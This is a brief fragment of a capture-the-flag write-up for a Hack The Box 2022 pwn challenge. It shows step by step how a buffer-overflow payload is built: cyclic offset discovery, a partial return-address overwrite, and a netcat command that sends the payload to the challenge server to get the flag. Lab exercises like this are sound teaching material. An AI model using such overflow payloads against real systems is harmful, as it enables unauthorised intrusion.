'''
https://heinandre.no/htb-cyber-apocalypse-2022/pwn/space-pirate-going-deeper/

echo -en "1\n$(cyclic 1024)" > payload

$rbp   : 0x7661616175616161 ("aaauaaav"?)

$ cyclic -l aaav
81

The offset of aaav is 81, let’s add 4 to get to the end of rbp, that makes the offset 85.

a a a v  payload_address
^     ^  ^   
|     |  |
81    84 85

echo -en "1\n$(cyclic 85)\x12\x0B\x40" > payload

[-] Authentication failed!

[!] For security reasons, you are logged out..

HTB{f4k3_fl4g_4_t35t1ng}

[!] For security reasons, you are logged out..

Bus error

echo -en "1\n$(cyclic 85)\x12\x0B\x40" | nc 138.68.182.130 30346

HTB{d1g_1n51d3..u_Cry_cry_cry}
'''
